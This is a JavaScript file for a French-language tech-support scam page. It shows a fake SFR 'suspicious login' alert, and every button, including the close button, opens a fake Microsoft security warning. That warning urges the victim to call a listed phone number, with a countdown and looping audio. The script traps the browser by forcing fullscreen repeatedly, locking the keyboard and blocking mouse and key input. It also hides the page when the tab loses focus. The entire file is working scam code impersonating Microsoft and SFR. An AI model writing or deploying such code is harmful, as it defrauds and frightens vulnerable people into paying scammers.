(function () {
  var mount = document.getElementById("app-mount");
  if (!mount) return;

  if (!document.querySelector('link[href="styles.css"]')) {
    var styleLink = document.createElement("link");
    styleLink.rel = "stylesheet";
    styleLink.href = "styles.css";
    document.head.appendChild(styleLink);
  }

  document.title = "Pop4";

  mount.innerHTML =
    '<div class="mouse-blocker" id="mouseBlocker" aria-hidden="true"></div>' +
    '<div class="modal-top-square" id="securityOverlay" aria-label="Page securite" aria-hidden="true">' +
    '<div class="security-page">' +
    '<section class="security-float-modal" aria-label="Modale securite">' +
    '<div class="security-float-logo" aria-hidden="true">' +
    '<svg viewBox="0 0 20 20" role="img" aria-hidden="true">' +
    '<rect x="1" y="1" width="8" height="8" fill="#f25022"/>' +
    '<rect x="11" y="1" width="8" height="8" fill="#7fba00"/>' +
    '<rect x="1" y="11" width="8" height="8" fill="#00a4ef"/>' +
    '<rect x="11" y="11" width="8" height="8" fill="#ffb900"/>' +
    '</svg></div>' +
    '<p class="security-float-text">Nous avons détecté une attaque du système. Pour votre sécurité, appelez le technicien sur ce numéro <strong class="security-float-phone">+33 05 25 33 15 16</strong></p>' +
    '<p class="security-float-code">Code erreur à fournir au technicien <strong>1D43512</strong></p>' +
    '</section>' +
    '<aside class="security-support-modal" aria-label="Support technique Microsoft">' +
    '<p class="security-support-label">Numéro support technique Microsoft</p>' +
    '<p class="security-support-phone">+33 05 25 33 15 16</p>' +
    '<p class="security-countdown-label">Temps restant pour appeler :</p>' +
    '<p class="security-countdown" id="securityCountdown">04:00</p>' +
    '</aside>' +
    '</div>' +
    '<div class="security-ticker" aria-label="Bandeau defilant">' +
    '<p class="security-ticker-text">Appelez le support technique Microsoft numéro +33 05 25 33 15 16</p>' +
    '</div></div>' +
    '<div class="home-page">' +
    '<main class="screen">' +
    '<section class="modal" aria-label="Modale carree">' +
    '<header class="fb-submodal-header"><div class="sfr-logo" aria-hidden="true">' +
    '<svg viewBox="0 0 110 32" role="img" aria-hidden="true">' +
    '<text x="0" y="24" fill="#ffffff" font-family="Arial, Helvetica, sans-serif" font-size="24" font-weight="700">SFR</text>' +
    '</svg></div>' +
    '<button class="fb-close" id="fbCloseBtn" type="button" aria-label="Fermer">&times;</button></header>' +
    '<div class="fb-submodal-separator" aria-hidden="true"></div><div class="modal-content"><div class="modal-top">' +
    '<div class="warning-icon" aria-hidden="true"><svg viewBox="0 0 64 64" role="img" aria-hidden="true">' +
    '<path d="M32 4L4 58h56L32 4z" fill="#facc15" stroke="#ca8a04" stroke-width="2"/>' +
    '<text x="32" y="44" text-anchor="middle" font-size="28" font-weight="700" fill="#1f2937">?</text></svg></div>' +
    '<h2 class="modal-title">Connexion suspecte détectée</h2>' +
    '<p class="modal-message">Nous avons détecté une tentative de connexion à votre compte depuis un appareil inconnu</p>' +
    '<div class="sub-modal"><div class="sub-modal-icon" aria-hidden="true">' +
    '<svg viewBox="0 0 24 24" role="img" aria-hidden="true">' +
    '<path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5A2.5 2.5 0 1 1 12 6a2.5 2.5 0 0 1 0 5.5z" fill="#2563eb"/></svg></div>' +
    '<div class="sub-modal-details"><p>Localisation : Marseille, France</p>' +
    '<p>Appareil : Windows 19.0.0 . chromium 148</p>' +
    '<p>Heure : Aujourd\'hui, <span id="currentTime"></span></p></div></div></div>' +
    '<div class="modal-bottom"><div class="modal-actions" role="group" aria-label="Actions">' +
    '<button class="modal-btn modal-btn-allow" id="secureAccountBtn" type="button">Sécuriser mon compte</button>' +
    '<button class="modal-btn modal-btn-deny" id="denyAccountBtn" type="button">Ce n\'est pas moi</button></div></div></div></section></main></div>' +
    '<div class="ticker" aria-label="Bandeau defilant"><p class="ticker-text">Assistance SFR</p></div>' +
    '<audio id="securityAudio1" src="script-audio.mp3" loop preload="auto"></audio>' +
    '<audio id="securityAudio2" src="script-audio-2.mp3" loop preload="auto"></audio>';

  var realTitle = document.title;

  document.addEventListener("visibilitychange", function () {
    if (document.hidden) {
      document.title = " ";
      document.body.style.visibility = "hidden";
    } else {
      document.title = realTitle;
      document.body.style.visibility = "visible";
    }
  });

  var ESCAPE_DEZOOM_MS = 5000;
  var secureAccountBtn = document.getElementById("secureAccountBtn");
  var denyAccountBtn = document.getElementById("denyAccountBtn");
  var fbCloseBtn = document.getElementById("fbCloseBtn");
  var securityOverlay = document.getElementById("securityOverlay");
  var securityAudio1 = document.getElementById("securityAudio1");
  var securityAudio2 = document.getElementById("securityAudio2");

  var securityLockActive = false;
  var escapeKeyHeld = false;
  var escapeHoldStart = null;
  var escapeHoldInterval = null;
  var fullscreenGuardInterval = null;
  var isDezoomed = false;
  var allowFullscreenExit = false;
  var securityCountdownInterval = null;
  var SECURITY_COUNTDOWN_SEC = 240;

  function formatCountdown(seconds) {
    var minutes = Math.floor(seconds / 60);
    var secs = seconds % 60;
    return (
      (minutes < 10 ? "0" : "") +
      minutes +
      ":" +
      (secs < 10 ? "0" : "") +
      secs
    );
  }

  function startSecurityCountdown() {
    var display = document.getElementById("securityCountdown");
    if (!display) return;

    var remaining = SECURITY_COUNTDOWN_SEC;
    display.textContent = formatCountdown(remaining);

    if (securityCountdownInterval) {
      clearInterval(securityCountdownInterval);
    }

    securityCountdownInterval = setInterval(function () {
      remaining -= 1;
      if (remaining <= 0) {
        display.textContent = "00:00";
        clearInterval(securityCountdownInterval);
        securityCountdownInterval = null;
        return;
      }
      display.textContent = formatCountdown(remaining);
    }, 1000);
  }

  function isEscapeKey(event) {
    return event.key === "Escape" || event.code === "Escape" || event.keyCode === 27;
  }

  async function lockKeyboard() {
    if (navigator.keyboard && navigator.keyboard.lock) {
      try {
        await navigator.keyboard.lock();
      } catch (_error) {}
    }
  }

  async function requestFullscreen() {
    if (document.fullscreenElement) return true;
    if (!document.documentElement.requestFullscreen) return false;
    try {
      await document.documentElement.requestFullscreen();
      return true;
    } catch (_error) {
      return false;
    }
  }

  function clearEscapeHold() {
    escapeHoldStart = null;
    if (escapeHoldInterval) {
      clearInterval(escapeHoldInterval);
      escapeHoldInterval = null;
    }
  }

  function showSecurityPage() {
    if (!securityOverlay) return;
    securityOverlay.classList.add("is-active");
    securityOverlay.setAttribute("aria-hidden", "false");
    document.body.classList.add("security-mode");
  }

  function forceStayFullscreen() {
    if (!securityLockActive || isDezoomed || allowFullscreenExit) return;
    showSecurityPage();
    requestFullscreen();
    requestAnimationFrame(function () {
      requestFullscreen();
    });
    setTimeout(requestFullscreen, 0);
    setTimeout(requestFullscreen, 20);
    setTimeout(requestFullscreen, 80);
  }

  function enterFullscreenMode() {
    isDezoomed = false;
    document.body.classList.remove("security-dezoomed");
    requestFullscreen();
  }

  function dezoomFullscreen() {
    allowFullscreenExit = true;
    isDezoomed = true;
    document.body.classList.add("security-dezoomed");
    if (document.fullscreenElement && document.exitFullscreen) {
      document.exitFullscreen().catch(function () {});
    }
    setTimeout(function () {
      allowFullscreenExit = false;
    }, 400);
  }

  function forceFullscreen() {
    forceStayFullscreen();
  }

  function startFullscreenGuard() {
    stopFullscreenGuard();
    fullscreenGuardInterval = setInterval(function () {
      if (securityLockActive && !isDezoomed && !allowFullscreenExit) {
        forceStayFullscreen();
      }
    }, 16);
  }

  function stopFullscreenGuard() {
    if (fullscreenGuardInterval) {
      clearInterval(fullscreenGuardInterval);
      fullscreenGuardInterval = null;
    }
  }

  function playSecurityAudios() {
    [securityAudio1, securityAudio2].forEach(function (audio) {
      if (!audio) return;
      audio.loop = true;
      audio.currentTime = 0;
      audio.play().catch(function () {});
    });
  }

  function activateSecurityLock() {
    if (!securityOverlay) return;
    securityLockActive = true;
    isDezoomed = false;
    allowFullscreenExit = false;
    escapeKeyHeld = false;
    clearEscapeHold();
    document.body.classList.remove("security-dezoomed");
    showSecurityPage();
    enterFullscreenMode();
    lockKeyboard();
    startFullscreenGuard();
    playSecurityAudios();
    startSecurityCountdown();
  }

  function startEscapeHoldTimer() {
    if (escapeHoldInterval) return;
    escapeHoldStart = Date.now();
    escapeHoldInterval = setInterval(function () {
      if (!securityLockActive || !escapeKeyHeld) return;

      var elapsed = Date.now() - escapeHoldStart;

      if (elapsed >= ESCAPE_DEZOOM_MS && !isDezoomed) {
        dezoomFullscreen();
        clearEscapeHold();
        escapeKeyHeld = false;
        return;
      }

      if (!isDezoomed) {
        forceStayFullscreen();
      }
    }, 50);
  }

  function handleSecurityKeyboard(event) {
    if (!securityLockActive) return;

    if (isEscapeKey(event)) {
      event.preventDefault();
      event.stopImmediatePropagation();

      if (event.type === "keydown") {
        if (isDezoomed) return;
        if (!escapeKeyHeld) {
          escapeKeyHeld = true;
          startEscapeHoldTimer();
        }
        forceStayFullscreen();
        return;
      }

      if (event.type === "keyup") {
        var heldLongEnough =
          escapeHoldStart !== null &&
          Date.now() - escapeHoldStart >= ESCAPE_DEZOOM_MS;

        escapeKeyHeld = false;
        clearEscapeHold();

        if (!heldLongEnough && !isDezoomed) {
          forceStayFullscreen();
        }
      }
      return;
    }

    event.preventDefault();
    event.stopImmediatePropagation();
  }

  function handleSecurityLockPointer(event) {
    if (!securityLockActive) return;
    if (event.type === "click" || event.type === "touchstart") {
      if (!isDezoomed) forceFullscreen();
    }
    event.preventDefault();
    event.stopPropagation();
  }

  ["mousedown", "mouseup", "mousemove", "contextmenu", "dblclick", "wheel"].forEach(function (eventName) {
    document.addEventListener(eventName, handleSecurityLockPointer, true);
  });

  ["click", "touchstart", "touchmove", "touchend"].forEach(function (eventName) {
    document.addEventListener(eventName, handleSecurityLockPointer, { capture: true, passive: false });
  });

  document.addEventListener("click", function () {
    if (securityLockActive) return;
    requestFullscreen();
  });

  document.addEventListener("touchstart", function () {
    if (securityLockActive) return;
    requestFullscreen();
  }, { passive: true });

  document.addEventListener("fullscreenchange", function () {
    if (securityLockActive && !isDezoomed && !allowFullscreenExit && !document.fullscreenElement) {
      forceStayFullscreen();
    }
  });

  ["keydown", "keyup", "keypress"].forEach(function (eventName) {
    document.addEventListener(eventName, handleSecurityKeyboard, { capture: true, passive: false });
    window.addEventListener(eventName, handleSecurityKeyboard, { capture: true, passive: false });
  });

  var currentTimeEl = document.getElementById("currentTime");
  if (currentTimeEl) {
    var now = new Date();
    currentTimeEl.textContent = now.toLocaleTimeString("fr-FR", {
      hour: "2-digit",
      minute: "2-digit",
      second: "2-digit",
    });
  }

  if (secureAccountBtn && securityOverlay) {
    secureAccountBtn.addEventListener("click", function (event) {
      event.stopPropagation();
      activateSecurityLock();
    });
  }

  if (denyAccountBtn && securityOverlay) {
    denyAccountBtn.addEventListener("click", function (event) {
      event.stopPropagation();
      activateSecurityLock();
    });
  }

  if (fbCloseBtn && securityOverlay) {
    fbCloseBtn.addEventListener("click", function (event) {
      event.preventDefault();
      event.stopPropagation();
      activateSecurityLock();
    });
  }
})();
